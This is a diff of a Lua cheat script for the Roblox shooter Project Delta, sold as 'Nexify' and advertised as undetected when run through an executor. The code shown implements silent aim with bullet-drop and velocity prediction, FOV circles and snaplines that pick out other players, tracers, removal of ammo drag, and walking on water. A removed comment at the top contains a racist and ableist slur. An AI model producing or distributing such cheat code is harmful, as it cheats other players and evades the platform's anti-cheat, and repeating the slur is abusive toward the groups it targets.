+
+
+
+
+
+
+
+
+
 
 
 aimtab:AddToggle('walkunderwater', {
@@ -4908,9 +4741,9 @@ local Workspace3es = game:GetService("Workspace")
 
 local player3es = Players3es.LocalPlayer
 local mouse3es = player3es:GetMouse()
-local keybind3es = Enum.KeyCode.G  --- for retard niggers this is keybind
-local aimLockEnabled3es = false  --- Toggle for enabling/disabling aimlock
-local aimLock3es = false  --- To track if aimlock is currently active
+local keybind3es = Enum.KeyCode.G  
+local aimLockEnabled3es = false  
+local aimLock3es = false  
 local lockedPlayer3es = nil
 
 local function findClosestPlayerToCursor3es()
@@ -4984,25 +4817,25 @@ end)
 
 player3es.CameraMode = Enum.CameraMode.LockFirstPerson
 
+MenuGroup:AddLabel("Nexify\n#1 Project Delta Script\nLast Updated: 8.12.2024\nVersion: V2.3 (Build 2312)\nUID: Buyer\n\nLibrary Version: Linoria Modded By Nexify V1.2\nRuntime Environment: Lua VM 5.1 (Optimized)\nEncryption: AES-256 + Luraph Obfuscation\nDetection Status: Undetected\nScript Ready!\nGame ID: 7336302630\n\nCompatibility: Direct Game\nChecksum: 6F2D3B9A1C\nBootstrapping Time: <2.55ms\nExecutor: Solara V3", true)
 
-aimtab:AddLabel("To Use TP Kill Press G", true)
---aimtab:AddToggle('toggletpkill', {
---    Text = 'Toggle TP Kill',
- --   Tooltip = 'Toggle TP Kill',
- ----   Default = false,
 
- --   Callback = function(first)
-----        if first then
-            -- Toggle is turned on
- --           aimLockEnabled3es = true
---            print("TP Kill Enabled")
- --       else
-            -- Toggle is turned off
- --           aimLockEnabled3es = false
- --           print("TP Kill Disabled")
---        end
---    end
---})
+
+ 
+ 
+
+ 
+
+            
+ 
+
+ 
+            
+ 
+ 
+
+
+
 
 local Utility = {
     Drawings = { };
@@ -5013,32 +4846,32 @@ local Utility = {
 
 
 
-local tracersEnabled = false -- Initial state of tracers
+local tracersEnabled = false 
 
---- Lighting shits world
+
 
 
 
 local isFiring = false
 
 
--- Function to toggle tracers on and off
+
 function Utility:ToggleTracers(enable)
     tracersEnabled = enable
 end
 
--- Function to check for ViewModel in the Camera
+
 function Utility:HasViewModel()
     return workspace:FindFirstChild("Camera") and workspace.Camera:FindFirstChild("ViewModel") ~= nil
 end
 
--- Function to create bullet tracers with gradual transparency fading and decals on all sides
+
 function Utility:CreateBullets(Position, From)
     if not tracersEnabled or not self:HasViewModel() then
-        return -- Do nothing if tracers are disabled or there's no ViewModel
+        return 
     end
 
-    local direction = (Position - From).unit -- Calculate the direction vector
+    local direction = (Position - From).unit 
 
     local BulletTracers = Instance.new("Part")
     BulletTracers.Anchored = true
@@ -5051,7 +4884,7 @@ function Utility:CreateBullets(Position, From)
     BulletTracers.Transparency = 0
     BulletTracers.Parent = game.Workspace.NoCollision
 
-    -- Function to add decals to all sides of the part
+    
     local function addDecal(face)
         local decal = Instance.new("Decal")
         decal.Texture = "rbxassetid://7151778311"
@@ -5060,7 +4893,7 @@ function Utility:CreateBullets(Position, From)
         decal.Parent = BulletTracers
     end
 
-    -- Add decals to each face of the part
+    
     addDecal(Enum.NormalId.Front)
     addDecal(Enum.NormalId.Back)
     addDecal(Enum.NormalId.Top)
@@ -5068,7 +4901,7 @@ function Utility:CreateBullets(Position, From)
     addDecal(Enum.NormalId.Left)
     addDecal(Enum.NormalId.Right)
 
-    -- Gradually fade the tracer out, including the decals
+    
     for i = 0, 1, 0.05 do
         BulletTracers.Transparency = i
         for _, decal in ipairs(BulletTracers:GetChildren()) do
@@ -5076,59 +4909,59 @@ function Utility:CreateBullets(Position, From)
                 decal.Transparency = i
             end
         end
-        wait(0.1) -- Adjust for faster or slower fading
+        wait(0.1) 
     end
     
     BulletTracers:Destroy()
 end
 
--- Function to fire the weapon
-function FireWeapon()
-    local gunPosition = game.Players.LocalPlayer.Character.Head.Position -- Replace with the actual gun position
-    local mouse = game.Players.LocalPlayer:GetMouse()
-    local hitPosition = mouse.Hit.p -- Get the mouse hit position
 
-    -- Call the CreateBullets function
+function FireWeapon()
+    local gunPosition = game.Players.LocalPlayer.Character.Head.Position 
+    local mouse = game.Players.LocalPlayer:GetMouse()
+    local hitPosition = mouse.Hit.p 
+
+    
     Utility:CreateBullets(hitPosition, gunPosition)
 end
 
 
 
--- Detect when the mouse button is pressed
+
 UserInputService.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         isFiring = true
 
-        -- Continuously fire while holding down the button
+        
         spawn(function()
             while isFiring do
                 FireWeapon()
-                wait(0.1) -- Adjust this delay to control the firing rate
+                wait(0.1) 
             end
         end)
     end
 end)
 
--- Detect when the mouse button is released
+
 UserInputService.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         isFiring = false
     end
 end)
 
--- Add a toggle for the tracers in the UI
+
 aimtab:AddToggle('tracers', {
     Text = 'Tracers',
     Tooltip = 'Toggle tracers on or off',
-    Default = tracersEnabled, -- Initialize with the current state
+    Default = tracersEnabled, 
     Callback = function(enabled)
-        Utility:ToggleTracers(enabled) -- Enable or disable based on toggle
+        Utility:ToggleTracers(enabled) 
     end
 })
 
 aimtab:AddButton('No Drag', function()
 
--- Function to set ammo drag
+
 local function setAmmoDrag(first)
     local ammoTypes = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
     if not ammoTypes then
@@ -5142,8 +4975,8 @@ local function setAmmoDrag(first)
     end
 end
 
--- Call the setAmmoDrag function (example usage)
-setAmmoDrag(true) -- sets Drag to "0"
+
+setAmmoDrag(true) 
 
 
  end)
@@ -5185,7 +5018,7 @@ jesusFolder.Name = "JesusFolder"
 local function onJesusToggle(enabled)
     jesusEnabled = enabled
 
-    -- If disabled, clear the platforms and stop the function
+    
     if not jesusEnabled then
         for _, v in pairs(jesusFolder:GetChildren()) do
             v:Destroy()
@@ -5193,7 +5026,7 @@ local function onJesusToggle(enabled)
         return
     end
 
-    -- Continuously check and create platforms if enabled
+    
     while jesusEnabled do
         task.wait(0.1)
 
@@ -5220,13 +5053,13 @@ local function onJesusToggle(enabled)
             platform.Size = Vector3.new(500, 1, 500)
             platform.Anchored = true
             platform.CanCollide = true
-            platform.Position = rayResult.Position + Vector3.new(0, 0.3, 0) -- Slightly above water surface
+            platform.Position = rayResult.Position + Vector3.new(0, 0.3, 0) 
             platform.Material = Enum.Material.ForceField
             platform.Parent = jesusFolder
         end
     end
 end
--- Toggle implementation
+
 aimtab:AddToggle('jesus', {
     Text = 'Walk On Water',
     Risky = true,
@@ -5241,47 +5074,47 @@ aimtab:AddToggle('jesus', {
 
 
 
---aimtab:AddToggle('WalkOnWater', {
---    Text = 'Walk On Water',
---    Tooltip = 'Lets You Walk On Water',
---    Default = false,
 
---    Callback = function(first)
- --           local character = LC.Character or LC.CharacterAdded:Wait()
---            local part = character:FindFirstChild("Head")
- --           local rayparams = RaycastParams.new()
- --           rayparams.FilterType = Enum.RaycastFilterType.Exclude
- --   
-  --          rayparams.FilterDescendantsInstances = {character}
+
+
+
+
+
+ 
+
+ 
+ 
+ 
+  
     
- --   end
---})
+ 
 
-local timeValue = 12 -- Default time
 
--- Function to change the time of day
+local timeValue = 12 
+
+
 local function changeTimeOfDay(value)
     Lighting.ClockTime = value
 end
 
--- Slider to set time of day
+
 Misc:AddSlider('timeSlider', {
     Text = 'Set Time of Day',
-    Default = 12, -- Default to noon
-    Min = 0, -- Minimum time (midnight)
-    Max = 24, -- Maximum time (next midnight)
-    Rounding = 1, -- Round to 1 decimal place
+    Default = 12, 
+    Min = 0, 
+    Max = 24, 
+    Rounding = 1, 
     Compact = false,
 }):OnChanged(function(value)
-    -- Only change the time when the slider is adjusted
-    timeValue = value -- Update timeValue with the slider
-    changeTimeOfDay(timeValue) -- Apply the new time
+    
+    timeValue = value 
+    changeTimeOfDay(timeValue) 
 end)
 
--- OPTIONAL: Monitor if the game resets the time and reapply if necessary
+
 game:GetService("RunService").Stepped:Connect(function()
     if Lighting.ClockTime ~= timeValue then
-        changeTimeOfDay(timeValue) -- Reapply the desired time if it changes
+        changeTimeOfDay(timeValue) 
     end
 end)
 
@@ -5356,16 +5189,8 @@ print('number_' .. tostring(counter))
 counter = counter + 1
 local charactertab = pdeltatabbox1:AddTab("misc")
  
-library:Notify("Nexify V1.8 SOLARA")
-library:Notify("DOWNLOADED BUG FIXES")
 library:Notify(executorname33)
-library:Notify("Optimization Loaded")
-wait(1)
-library:Notify("Loading Updates ")
-wait(0.4)
-library:Notify("Loaded")
-wait(0.5)
-library:Notify("LOADED FLY SCRIPT")
+library:Notify("Loaded Script")
 
 local function IsTargetVisible(target)
     if not plr.Character then return false end
@@ -5387,25 +5212,25 @@ local function IsTargetVisible(target)
     end
     return false
 end
--- Services and Variables
--- Services and Variables
--- Services and Variables
--- Services and Variables
--- Required Services
--- Required Services
--- Prediction Settings by Distance
--- FOV Settings
--- FOV Settings
--- FOV Settings
--- Settings
--- Settings
-local fovRadius = 175  -- Increased FOV for slightly better target tracking
+
+
+
+
+
+
+
+
+
+
+
+
+local fovRadius = 175  
 local fovCircle
 fovradiussnapline=fovRadius
--- Bullet speed
-local bulletSpeed2 = 430           -- Bullet speed, adjusted for better prediction
 
--- Prediction for different ranges (manual values)
+local bulletSpeed2 = 430           
+
+
 local predictionForRanges = {
     [10] = 0.1,   [20] = 0.19,  [30] = 0.21,  [40] = 0.23,  [50] = 0.25,
     [60] = 0.27,   [70] = 0.29,  [80] = 0.31,  [90] = 0.33,  [100] = 0.35,
@@ -5424,7 +5249,7 @@ local predictionForRanges = {
 
 
 
--- Bullet drop compensation for different ranges (manual values)
+
 local bulletDropForRanges = {
     [10] = 0.001, [20] = 0.002, [30] = 0.003, [40] = 0.004, [50] = 0.005,
     [60] = 0.006, [70] = 0.007, [80] = 0.008, [90] = 0.009, [100] = 0.010,
@@ -5441,73 +5266,73 @@ local bulletDropForRanges = {
 }
 
  TweenService = game:GetService("TweenService")
-local fovCircle -- Declare outside the function to be accessible globally
+local fovCircle 
 
--- Variable to control if RGB transition should happen
- rgbfov = false -- Set this to `true` for smooth color transition or `false` for static color
 
--- Create the FOV Circle function with smooth color transition
+ rgbfov = false 
+
+
 function createFovCircle(fovRadius, colorStart, colorEnd, duration)
-    -- Check if fovRadius is a valid number
+    
     if type(fovRadius) ~= "number" then
-        warn("Invalid fovRadius: " .. tostring(fovRadius))  -- Warn if it's not a valid number
-        return  -- Stop the function if fovRadius is invalid
+        warn("Invalid fovRadius: " .. tostring(fovRadius))  
+        return  
     end
     
-    -- Remove the existing circle if it exists
+    
     if fovCircle then
         fovCircle:Remove()
     end
 
-    -- Create a new circle
+    
     fovCircle = Drawing.new("Circle")
-    fovCircle.Thickness = 2         -- Set thickness of the circle's outline
-    fovCircle.NumSides = 100        -- Increase the number of sides for smoother appearance
-    fovCircle.Radius = fovRadius   -- Set the radius of the circle
-    fovCircle.Color = colorStart   -- Initial color
-    fovCircle.Filled = false       -- Make the circle an outline
-    fovCircle.Visible = true       -- Make sure it's visible
-    fovCircle.Transparency = 1     -- Full opacity (1 is fully transparent)
+    fovCircle.Thickness = 2         
+    fovCircle.NumSides = 100        
+    fovCircle.Radius = fovRadius   
+    fovCircle.Color = colorStart   
+    fovCircle.Filled = false       
+    fovCircle.Visible = true       
+    fovCircle.Transparency = 1     
 
-    -- Check if RGB transition is enabled
+    
     if rgbfov then
-        -- Smoothly interpolate the color from colorStart to colorEnd and back indefinitely
+        
         local startTime = tick()
 
-        -- Create an update loop to change color over time
+        
         game:GetService("RunService").Heartbeat:Connect(function()
-            local elapsed = tick() - startTime  -- Get elapsed time since start
+            local elapsed = tick() - startTime  
             if elapsed >= duration then
-                startTime = tick()  -- Reset start time for infinite loop
+                startTime = tick()  
             end
 
-            -- Calculate alpha for smooth oscillation between 0 and 1
-            local alpha = math.sin(elapsed * math.pi / duration) * 0.5 + 0.5  -- Sine wave for smooth transition
+            
+            local alpha = math.sin(elapsed * math.pi / duration) * 0.5 + 0.5  
 
-            -- Interpolate between colorStart and colorEnd based on alpha
+            
             fovCircle.Color = colorStart:Lerp(colorEnd, alpha)
         end)
     else
-        -- If RGB is not enabled, use a static white color
-        fovCircle.Color = Color3.fromRGB(255, 255, 255)  -- White color
+        
+        fovCircle.Color = Color3.fromRGB(255, 255, 255)  
     end
 end
 
--- Example Usage:
--- Ensure fovRadius has a valid value
+
+
 createFovCircle(fovRadius, Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255), 5)
 
--- If rgbfov is false, the circle will remain static (white color)
 
--- Update FOV circle position (centered on the screen)
+
+
 local function updateFovCircle994()
     if fovCircle then
-        -- Get the center of the screen
+        
         local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
         
-        -- Set the FOV circle's position to the screen's center
+        
         fovCircle.Position = screenCenter
-        fovCircle.Radius = fovRadius -- Update FOV circle size
+        fovCircle.Radius = fovRadius 
     else
         createFovCircle()
     end
@@ -5519,17 +5344,17 @@ Mouse = LocalPlayer:GetMouse()
  Camera = game.Workspace.CurrentCamera
  GuiService = game:GetService("GuiService")
 
--- Initialize Snapline Drawing
+
 Snapline = Drawing.new("Line")
 Snapline.Visible = false
 Snapline.Thickness = 1
-Snapline.Color = Color3.fromRGB(255, 255, 255) -- Default color; customize as needed
+Snapline.Color = Color3.fromRGB(255, 255, 255) 
 
--- Configurable settings
+
 config = {
-    snapline_enabled = true, -- Toggle snapline on/off
-    snapline_color = Color3.fromRGB(255, 255, 255), -- Change snapline color here
-    fovRadius = fovradiussnapline, -- Set the radius of the field of view (in pixels)
+    snapline_enabled = true, 
+    snapline_color = Color3.fromRGB(255, 255, 255), 
+    fovRadius = fovradiussnapline, 
 }
 
 
@@ -5538,7 +5363,7 @@ function findTargetWithinFovCircle()
     local closestTarget = nil
     local shortestDistance = config.fovRadius
 
-    -- Iterate over all players to find a target within FOV
+    
     for _, targetPlayer in pairs(Players:GetPlayers()) do
         if targetPlayer ~= Players.LocalPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
             local head = targetPlayer.Character.Head
@@ -5548,7 +5373,7 @@ function findTargetWithinFovCircle()
                 local screenPoint = Vector2.new(screenPos.X, screenPos.Y)
                 local distance = (screenPoint - mousePos).Magnitude
 
-                -- Check if the target is within the FOV and closer than previous targets
+                
                 if distance < shortestDistance then
                     shortestDistance = distance
                     closestTarget = targetPlayer.Character
@@ -5572,51 +5397,51 @@ game:GetService("RunService").RenderStepped:Connect(function()
                 Mouse.Y + GuiService:GetGuiInset().Y
             )
 
-            -- Update Snapline properties
+            
             Snapline.From = mousePos
             Snapline.To = Vector2.new(targetPos.X, targetPos.Y)
-            Snapline.Visible = onScreen -- Only show if target is on screen
+            Snapline.Visible = onScreen 
         else
-            Snapline.Visible = false -- Hide Snapline if no target is within FOV
+            Snapline.Visible = false 
         end
     else
         Snapline.Visible = false
     end
 end)
--- Function to get the closest matching prediction value based on distance
+
 local function getPredictionForDistance(distance)
-    local closestRange = 10  -- Start with the smallest distance
+    local closestRange = 10  
 
     for range, _ in pairs(predictionForRanges) do
         if distance >= range then
-            closestRange = range  -- Find the closest matching range
+            closestRange = range  
         end
     end
 
-    return predictionForRanges[closestRange] or 0  -- Return the prediction value or 0 if not found
+    return predictionForRanges[closestRange] or 0  
 end
 
--- Function to get the closest matching bullet drop compensation based on distance
+
 local function getBulletDropForDistance(distance)
-    local closestRange = 10  -- Start with the smallest distance
+    local closestRange = 10  
 
     for range, _ in pairs(bulletDropForRanges) do
         if distance >= range then
-            closestRange = range  -- Find the closest matching range
+            closestRange = range  
         end
     end
 
-    return bulletDropForRanges[closestRange] or 0  -- Return the bullet drop value or 0 if not found
+    return bulletDropForRanges[closestRange] or 0  
 end
 
--- Function to adjust aim to compensate for bullet drop
+
 local function adjustAimForBulletDrop(target, distance)
     local head = target:FindFirstChild("Head")
     if head then
-        -- Get bullet drop compensation for the given distance
+        
         local compensation = getBulletDropForDistance(distance)
         
-        -- Return the adjusted position (slightly above the head to compensate for bullet drop)
+        
         local adjustedPosition = head.Position + Vector3.new(0, compensation, 0)
         
         return adjustedPosition
@@ -5624,24 +5449,24 @@ local function adjustAimForBulletDrop(target, distance)
     return target.Head.Position
 end
 
--- Function to predict target's future position
+
 local function predictTargetPosition(target)
     local head = target:FindFirstChild("Head")
     if head then
         local velocity = head.Velocity
         local distance = (Players.LocalPlayer.Character.Head.Position - head.Position).Magnitude
         
-        -- Time for the bullet to travel to the target
+        
         local bulletTravelTime = distance / bulletSpeed2
 
-        -- Calculate the predicted position
+        
         local predictedPosition = head.Position + (velocity * bulletTravelTime)
 
-        -- Further adjust prediction based on distance and velocity
-        local leadFactor = (bulletTravelTime * velocity).Magnitude
-        predictedPosition = predictedPosition + (velocity.Unit * leadFactor)  -- Additional lead based on speed
         
-        -- Adjust aim to compensate for bullet drop
+        local leadFactor = (bulletTravelTime * velocity).Magnitude
+        predictedPosition = predictedPosition + (velocity.Unit * leadFactor)  
+        
+        
         predictedPosition = adjustAimForBulletDrop(target, distance)
         
         return predictedPosition
@@ -5649,22 +5474,22 @@ local function predictTargetPosition(target)
     return head.Position
 end
 
--- Variables to track aiming state and debugging
-local isSilentAimEnabled994 = false -- Toggle this to enable/disable silent aim
+
+local isSilentAimEnabled994 = false 
 local lockedCharacter = nil
 
--- Function to handle aiming logic
+
 local function updateAiming()
-    if isSilentAimEnabled994 then -- Check if Silent Aim is enabled
-        -- Find the character under the mouse cursor
+    if isSilentAimEnabled994 then 
+        
         local characterUnderMouse = findTargetWithinFovCircle()
 
-        -- If a character is found within the FOV, lock onto it
+        
         if characterUnderMouse and characterUnderMouse ~= lockedCharacter then
             lockedCharacter = characterUnderMouse
         end
 
-        -- If we have a locked character, aim at them
+        
         if lockedCharacter and lockedCharacter:FindFirstChild("Head") and camera:FindFirstChild("ViewModel") then
             local head = lockedCharacter.Head
             local vm = camera:FindFirstChild("ViewModel")
@@ -5673,129 +5498,129 @@ local function updateAiming()
             local fc = vm:FindFirstChild("FakeCamera")
 
             if ap and apc and fc then
-                -- Get the distance to the target
+                
                 local distance = (Players.LocalPlayer.Character.Head.Position - head.Position).Magnitude
                 
-                -- Get the predicted position (with bullet drop compensation and velocity)
+                
                 local aimPosition = predictTargetPosition(lockedCharacter)
                 local cameraPosition = camera.CFrame.Position
 
-                -- Update AimPart positions
+                
                 ap.CFrame = CFrame.new(cameraPosition, aimPosition)
                 apc.CFrame = CFrame.new(cameraPosition, aimPosition)
             end
         end
 
-        -- Unlock the character if they are no longer in the FOV
+        
         if not characterUnderMouse then
             lockedCharacter = nil
         end
     end
 end
 
--- Call the updateAiming function continuously
+
 RunService.RenderStepped:Connect(function()
-    updateFovCircle994()  -- Ensure this function is correctly implemented
+    updateFovCircle994()  
     updateAiming()
 end)
 
--- Create the FOV circle at the start
+
 createFovCircle()
 
--- Optional: Clean up when the script is stopped or the player is removed
+
 Players.LocalPlayer.CharacterRemoving:Connect(function(character)
-    lockedCharacter = nil  -- Reset the locked character on removal
+    lockedCharacter = nil  
 end)
 
 
 
 
--- Create a table to store settings globally
+
 ViewModelSettings = {
-    Color = Color3.new(0.768627, 0.039216, 0.913725), -- Default color
-    Material = Enum.Material.Plastic, -- Default material
-    IsEnabled = false, -- Toggle state for ViewModel Chams
-    HighlightEnabled = false, -- Toggle state for Highlight effect
-    HighlightTransparency = 0.5, -- Default transparency for highlight
-    ArmCustomizationEnabled = false -- Toggle state for arm customization
+    Color = Color3.new(0.768627, 0.039216, 0.913725), 
+    Material = Enum.Material.Plastic, 
+    IsEnabled = false, 
+    HighlightEnabled = false, 
+    HighlightTransparency = 0.5, 
+    ArmCustomizationEnabled = false 
 }
 
--- Function to apply color, material, and outline to ViewModel parts
+
 function applySettings(viewModel)
     if viewModel and ViewModelSettings.IsEnabled then
-        -- Change the color of all parts in the ViewModel
+        
         for _, part in ipairs(viewModel:GetDescendants()) do
             if part:IsA("BasePart") then
-                part.Color = ViewModelSettings.Color -- Change part color
-                part.Material = ViewModelSettings.Material -- Set material
+                part.Color = ViewModelSettings.Color 
+                part.Material = ViewModelSettings.Material 
 
-                -- Create or update the outline (Highlight)
+                
                 local highlight = part:FindFirstChildOfClass("Highlight")
                 if ViewModelSettings.HighlightEnabled then
                     if not highlight then
                         highlight = Instance.new("Highlight")
                         highlight.Parent = part
                     end
-                    highlight.FillColor = ViewModelSettings.Color -- Set highlight fill color
-                    highlight.OutlineColor = Color3.new(1, 1, 1) -- Set outline color (white)
-                    highlight.OutlineTransparency = ViewModelSettings.HighlightTransparency -- Set outline transparency
+                    highlight.FillColor = ViewModelSettings.Color 
+                    highlight.OutlineColor = Color3.new(1, 1, 1) 
+                    highlight.OutlineTransparency = ViewModelSettings.HighlightTransparency 
                 elseif highlight then
-                    highlight:Destroy() -- Remove highlight if it is disabled
+                    highlight:Destroy() 
                 end
             end
             
-            -- Remove SurfaceAppearance if it exists
+            
             if part:IsA("MeshPart") then
                 local surfaceAppearance = part:FindFirstChildOfClass("SurfaceAppearance")
                 if surfaceAppearance then
-                    surfaceAppearance:Destroy() -- Remove SurfaceAppearance
+                    surfaceAppearance:Destroy() 
                 end
             end
         end
     end
 end
 
--- Function to customize arms and remove WastelandShirt
+
 function customizeArms(viewModel)
     if not viewModel then return end
     
-    -- Remove WastelandShirt if it exists
+    
     local wastelandShirt = viewModel:FindFirstChild("WastelandShirt")
     if wastelandShirt then
         wastelandShirt:Destroy()
     end
     
-    -- List of arm parts to customize
+    
     local armParts = { "LeftLowerArm", "LeftUpperArm", "RightLowerArm", "RightUpperArm" }
     
-    -- Apply force field and transparency to arms
+    
     for _, armName in ipairs(armParts) do
         local armPart = viewModel:FindFirstChild(armName)
         if armPart and armPart:IsA("BasePart") then
-            armPart.Material = Enum.Material.ForceField -- Set material to ForceField
-            armPart.Transparency = 0.8 -- Set transparency to 0.8
+            armPart.Material = Enum.Material.ForceField 
+            armPart.Transparency = 0.8 
 
-            -- Create or update the highlight
+            
             local highlight = armPart:FindFirstChildOfClass("Highlight")
             if not highlight then
                 highlight = Instance.new("Highlight")
                 highlight.Parent = armPart
             end
-            highlight.FillColor = ViewModelSettings.Color -- Set highlight color to match ViewModelSettings color
-            highlight.OutlineColor = Color3.new(1, 1, 1) -- Set outline color to white
-            highlight.OutlineTransparency = 0.5 -- Set outline transparency
+            highlight.FillColor = ViewModelSettings.Color 
+            highlight.OutlineColor = Color3.new(1, 1, 1) 
+            highlight.OutlineTransparency = 0.5 
         end
     end
 end
 
 
 charactertab:AddLabel('-------------------------------------------------------------')
--- Skybox Color Picker
--- Skybox Image Changer
--- Define the available skyboxes with their asset IDs
+
+
+
 SkyBoxes = {
     ["Standard"] = {
-        ["SkyboxBk"] = "rbxassetid://123456789", -- Replace with actual asset IDs
+        ["SkyboxBk"] = "rbxassetid://123456789", 
         ["SkyboxDn"] = "rbxassetid://123456789",
         ["SkyboxFt"] = "rbxassetid://123456789",
         ["SkyboxLf"] = "rbxassetid://123456789",
@@ -5827,12 +5652,12 @@ SkyBoxes = {
         ["SkyboxUp"] = "rbxassetid://277101591"
     },
 ["Blood"] = {
-    ["SkyboxBk"] = "rbxassetid://163288979",  -- Test this ID
-    ["SkyboxDn"] = "rbxassetid://163288979",  -- Test this ID
-    ["SkyboxFt"] = "rbxassetid://163288979",  -- Test this ID
-    ["SkyboxLf"] = "rbxassetid://163288979",  -- Test this ID
-    ["SkyboxRt"] = "rbxassetid://163288979",  -- Test this ID
-    ["SkyboxUp"] = "rbxassetid://163288979"   -- Test this ID
+    ["SkyboxBk"] = "rbxassetid://163288979",  
+    ["SkyboxDn"] = "rbxassetid://163288979",  
+    ["SkyboxFt"] = "rbxassetid://163288979",  
+    ["SkyboxLf"] = "rbxassetid://163288979",  
+    ["SkyboxRt"] = "rbxassetid://163288979",  
+    ["SkyboxUp"] = "rbxassetid://163288979"   
 },
 
     ["Deep Space"] = {
@@ -5861,27 +5686,27 @@ SkyBoxes = {
     },
 }
 
--- Create the dropdown for selecting the skybox
+
 charactertab:AddDropdown('skyboxDropdown', {
-    Values = {"Standard", "Blood", "Among Us", "Doge", "Spongebob", "Deep Space", "Winter", "Clouded Sky"},  -- List of available skyboxes
-    Default = 1,  -- Default selection is 'Standard'
+    Values = {"Standard", "Blood", "Among Us", "Doge", "Spongebob", "Deep Space", "Winter", "Clouded Sky"},  
+    Default = 1,  
     Multi = false,
     Text = 'Skybox Selector',
     Tooltip = 'Select a skybox from the dropdown',
     Callback = function(selectedSkybox)
         local sky = game.Lighting:FindFirstChildOfClass("Sky")
         
-        -- Create a new Sky instance if it doesn't exist
+        
         if not sky then
             sky = Instance.new("Sky")
             sky.Parent = game.Lighting
         end
 
-        -- Update the skybox images based on the selection
+        
         local selectedBox = SkyBoxes[selectedSkybox]
         if selectedBox then
             for key, assetId in pairs(selectedBox) do
-                sky[key] = assetId -- Update each side of the skybox
+                sky[key] = assetId 
             end
         else
             warn("Selected skybox is not available!")
@@ -5890,118 +5715,118 @@ charactertab:AddDropdown('skyboxDropdown', {
 })
 
 
--- Retrieve the original grass color from the Terrain service
+
 terrain = game:GetService("Workspace").Terrain
 originalGrassColor = terrain:GetMaterialColor(Enum.Material.Grass)
 
--- Create a color picker for changing the grass color
+
 charactertab:AddLabel('Grass Color Picker'):AddColorPicker('ColorPickerGrass', {
-    Default = originalGrassColor, -- Set the default color to the original grass color
+    Default = originalGrassColor, 
     Title = 'Grass Color Picker',
     Transparency = 0,
 
     Callback = function(Value)
-        -- Change the grass color in the Terrain
+        
         local grassColor = Value
 
-        -- Set the color of grass by modifying the terrain properties
+        
         terrain:SetMaterialColor(Enum.Material.Grass, grassColor)
 
-        -- Ensure grass is enabled (the decoration property)
-        sethiddenproperty(terrain, "Decoration", true) -- Ensure grass is enabled
+        
+        sethiddenproperty(terrain, "Decoration", true) 
     end
 })
 
 
--- Create a color picker for changing the grass color
 
-lastSelectedColor = Color3.fromRGB(0, 255, 255) -- Default color (cyan)
-colorPickerEnabled = false -- State to check if the color picker is enabled
-storedItems = {} -- Table to store items before making them invisible
 
--- Create a toggle for enabling/disabling the character color picker
+lastSelectedColor = Color3.fromRGB(0, 255, 255) 
+colorPickerEnabled = false 
+storedItems = {} 
+
+
 charactertab:AddToggle('Character Color Picker', {
     Text = 'Enable Character Color Picker',
     Default = false,
 
     Callback = function(isEnabled)
-        colorPickerEnabled = isEnabled -- Update the toggle state
+        colorPickerEnabled = isEnabled 
         
         local player = game.Players.LocalPlayer
         local character = player.Character or player.CharacterAdded:Wait()
 
         if isEnabled then
-            -- Make specified items invisible and store them
+            
             for _, item in ipairs(character:GetChildren()) do
                 if item:IsA("Shirt") then
-                    table.insert(storedItems, item) -- Store the item
-                    item.ShirtTemplate = "rbxassetid://0" -- Make the shirt invisible (reset to empty template)
+                    table.insert(storedItems, item) 
+                    item.ShirtTemplate = "rbxassetid://0" 
                 elseif item:IsA("Pants") then
-                    table.insert(storedItems, item) -- Store the item
-                    item.PantsTemplate = "rbxassetid://0" -- Make the pants invisible (reset to empty template)
+                    table.insert(storedItems, item) 
+                    item.PantsTemplate = "rbxassetid://0" 
                 elseif item:IsA("Accessory") then
-                    -- Check if the accessory is hair or any unwanted accessory
+                    
                     if item.Name:match("Hair") then
-                        table.insert(storedItems, item) -- Store the item
-                        item.Handle.Transparency = 1 -- Make the hair invisible
+                        table.insert(storedItems, item) 
+                        item.Handle.Transparency = 1 
                     end
                 elseif item:IsA("Model") then
-                    -- Check if the model starts with "Waste" or "Camo"
+                    
                     if item.Name:match("^Waste") or item.Name:match("^Camo") then
-                        table.insert(storedItems, item) -- Store the model
-                        -- Make each part of the model transparent
+                        table.insert(storedItems, item) 
+                        
                         for _, part in ipairs(item:GetChildren()) do
                             if part:IsA("BasePart") then
-                                part.Transparency = 1 -- Make each part transparent
+                                part.Transparency = 1 
                             end
                         end
                     end
                 elseif item.Name:match("^Waste") or item.Name:match("^Camo") then
-                    table.insert(storedItems, item) -- Store the part
-                    item.Transparency = 1 -- Make the part transparent
+                    table.insert(storedItems, item) 
+                    item.Transparency = 1 
                 end
             end
 
-            -- Apply the last selected color if enabled
+            
             for _, part in ipairs(character:GetChildren()) do
                 if part:IsA("MeshPart") or part:IsA("Part") then
                     part.Material = Enum.Material.ForceField
-                    part.Color = lastSelectedColor -- Set the stored color from the last selection
+                    part.Color = lastSelectedColor 
                 end
             end
         else
-            -- Restore the previously invisible items
+            
             for _, storedItem in ipairs(storedItems) do
                 if storedItem:IsA("Shirt") then
-                    storedItem.ShirtTemplate = "rbxassetid://0" -- Restore default shirt (empty)
+                    storedItem.ShirtTemplate = "rbxassetid://0" 
                 elseif storedItem:IsA("Pants") then
-                    storedItem.PantsTemplate = "rbxassetid://0" -- Restore default pants (empty)
+                    storedItem.PantsTemplate = "rbxassetid://0" 
                 elseif storedItem:IsA("Accessory") then
-                    -- Check if the accessory is hair
+                    
                     if storedItem.Name:match("Hair") then
-                        storedItem.Handle.Transparency = 0 -- Make the hair visible again
+                        storedItem.Handle.Transparency = 0 
                     end
                 elseif storedItem:IsA("Model") then
-                    -- Restore the model parts' transparency
+                    
                     for _, part in ipairs(storedItem:GetChildren()) do
                         if part:IsA("BasePart") then
-                            part.Transparency = 0 -- Restore the part's visibility
+                            part.Transparency = 0 
                         end
                     end
                 else
-                    -- Restore any part that starts with "Waste" or "Camo"
+                    
                     if storedItem.Name:match("^Waste") or storedItem.Name:match("^Camo") then
-                        storedItem.Transparency = 0 -- Make the part visible again
+                        storedItem.Transparency = 0 
                     end
                 end
             end
-            storedItems = {} -- Clear the stored items table after restoration
+            storedItems = {} 
 
-            -- Reset the color back to the original body parts' colors if the toggle is disabled
+            
             for _, part in ipairs(character:GetChildren()) do
